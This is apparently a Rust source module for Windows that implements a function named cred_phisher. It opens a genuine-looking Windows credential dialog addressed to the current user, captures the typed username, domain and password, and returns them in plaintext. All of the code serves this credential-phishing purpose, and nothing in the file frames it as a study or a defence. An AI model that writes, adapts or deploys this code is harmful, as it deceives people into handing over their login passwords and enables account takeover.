#[allow(unused_imports)]
use extargsparse_worker::{extargs_error_class,extargs_new_error};

#[allow(unused_imports)]
use winapi::um::wincred::{CredUIPromptForWindowsCredentialsW,CredUnPackAuthenticationBufferW,CREDUI_INFOW,PCREDUI_INFOW};
#[allow(unused_imports)]
use winapi::um::combaseapi::{CoTaskMemFree};
use winapi::shared::windef::{HWND,HBITMAP};
use winapi::shared::minwindef::{DWORD,ULONG,LPVOID,BOOL,FALSE};
use winapi::um::errhandlingapi::{GetLastError,SetLastError};
use winapi::um::winnt::LPWSTR;
use winapi::shared::winerror::{ERROR_INSUFFICIENT_BUFFER,ERROR_CANCELLED};

use super::wchar_windows::{str_to_c_wstr,wstr_to_str};

use std::error::Error;

#[allow(unused_imports)]
use super::{debug_trace,debug_buffer_trace,format_buffer_log,format_str_log};
#[allow(unused_imports)]
use super::loglib::{log_get_timestamp,log_output_function,init_log};


extargs_error_class!{CredLibError}

#[allow(non_snake_case)]
pub struct NetworkCredentials {
	pub Username :String,
	pub Password :String,
	pub Domain :String,
}

struct CoMemData {
	outbuf :LPVOID,
	outsize : ULONG,
}

impl CoMemData {
	fn new() -> CoMemData {
		CoMemData {
			outbuf : std::ptr::null_mut(),
			outsize : 0,
		}
	}
}

impl Drop for CoMemData {
	fn drop(&mut self) {
		if self.outbuf != std::ptr::null_mut() {
			unsafe {CoTaskMemFree(self.outbuf);}
			self.outbuf = std::ptr::null_mut();
		}
		self.outsize = 0;
	}
}

struct WStrBuf {
	buffer :LPWSTR,
	bufsize : DWORD,
	buflen : DWORD,
	bufv :Vec<u16>,
}

impl WStrBuf {
	fn new() -> WStrBuf {
		WStrBuf {
			buffer : std::ptr::null_mut(),
			bufsize : 0,
			buflen : 0,
			bufv :Vec::new(),
		}
	}

	fn realloc(&mut self,size :DWORD) {
		self.bufv = Vec::with_capacity(size as usize);
		self.buffer = self.bufv.as_mut_ptr();
		self.bufsize = size;
		return;
	}
	fn set_len(&mut self, llen :DWORD) {
		if llen > 0 {
			let slen :usize = (llen - 1) as usize;
			unsafe {
				self.bufv.set_len(slen);	
			}
			
			self.buflen = slen as DWORD;			
		} else {
			unsafe {
				self.bufv.set_len(0);
			}
			self.buflen = 0;
		}
		return;
	}

	fn to_string(&self) -> Result<String,Box<dyn Error>> {
		let mut ss :String = "".to_string();
		if self.bufv.len() > 0 {
			ss = wstr_to_str(&self.bufv);
			/*
			if ostr.is_none() {
				extargs_new_error!{CredLibError,"can not parse {:?}", self.bufv}
			}
			let sv :Box<[u8]> = ostr.unwrap();

			let s1 = unsafe{ std::str::from_utf8(&(*Box::into_raw(sv)))?};
			ss = s1.to_string();
			*/
		}
		return Ok(ss);
	}

}

impl Drop for WStrBuf {
	fn drop(&mut self) {
		self.buffer = std::ptr::null_mut();
		return;
	}
}


pub fn cred_phisher( msg :&str) -> Result<NetworkCredentials,Box<dyn Error>> {
	let omsg = str_to_c_wstr(msg);
	if omsg.is_none() {
		extargs_new_error!{CredLibError,"can not wchar [{}]",msg}
	}
	let wmsg = omsg.unwrap();
	let username :String;
	match std::env::var("USERNAME") {
		Ok(val) => {username = format!("Please enter credential for {}",val);},
		Err(e) => {
			extargs_new_error!{CredLibError,"can not get USERNAME [{:?}]",e}
		}
	}
	let ouser = str_to_c_wstr(&username);
	if ouser.is_none() {
		extargs_new_error!{CredLibError,"can not wchar [{}]",username}	
	}
	let wusername = ouser.unwrap();
	let mut credui :CREDUI_INFOW  = CREDUI_INFOW {
		cbSize : std::mem::size_of::<CREDUI_INFOW>() as DWORD,
		hwndParent : 0 as HWND,
		pszMessageText : wmsg.as_ptr(),
		pszCaptionText : wusername.as_ptr(),
		hbmBanner : 0 as HBITMAP,
	};
	let mut authpackage : ULONG = 0;
	let dret :DWORD ;
	let mut outcomem :CoMemData = CoMemData::new();
	let mut save :BOOL = FALSE;
	let mut bret :BOOL;

	let mut userbuf :WStrBuf = WStrBuf::new();
	let mut domainbuf :WStrBuf = WStrBuf::new();
	let mut passbuf :WStrBuf = WStrBuf::new();
	let mut usersize :DWORD;
	let mut domainsize :DWORD;
	let mut passsize :DWORD;
	let mut errcode :DWORD;

	userbuf.realloc(1);
	domainbuf.realloc(1);
	passbuf.realloc(1);

	unsafe {
		SetLastError(0);
		dret = CredUIPromptForWindowsCredentialsW(&mut credui,0,&mut authpackage,
				std::ptr::null(),0,&mut outcomem.outbuf,&mut outcomem.outsize,&mut save,1);
		if dret != 0 {
			errcode = GetLastError();
			if dret == ERROR_CANCELLED && errcode == 0 {
				return Ok(NetworkCredentials{
					Username : "".to_string(),
					Domain : "".to_string(),
					Password : "".to_string(),
				});
			}
			extargs_new_error!{CredLibError,"can not CredUIPromptForWindowsCredentialsW error [{}] [{}]", dret,errcode}
		}

		while 1 == 1 {
			usersize = userbuf.bufsize;
			domainsize = domainbuf.bufsize;
			passsize = passbuf.bufsize;

			SetLastError(0);
			bret = CredUnPackAuthenticationBufferW(0,outcomem.outbuf,outcomem.outsize,
				userbuf.buffer,&mut usersize,
				domainbuf.buffer,&mut domainsize,
				passbuf.buffer,&mut passsize);
			if bret == FALSE {
				errcode = GetLastError();
				if errcode != ERROR_INSUFFICIENT_BUFFER {
					extargs_new_error!{CredLibError,"can not CredUnPackAuthenticationBufferW  {}",errcode}	
				}
				userbuf.realloc(userbuf.bufsize << 1);
				domainbuf.realloc(domainbuf.bufsize << 1);
				passbuf.realloc(passbuf.bufsize << 1);
			} else {
				userbuf.set_len(usersize);
				domainbuf.set_len(domainsize);
				passbuf.set_len(passsize);
				break;
			}
		}
	}


	let names = userbuf.to_string()?;
	let domains = domainbuf.to_string()?;
	let passs = passbuf.to_string()?;


	let retv = NetworkCredentials{
		Username : names,
		Password : passs,
		Domain : domains,
	};
	Ok(retv)
}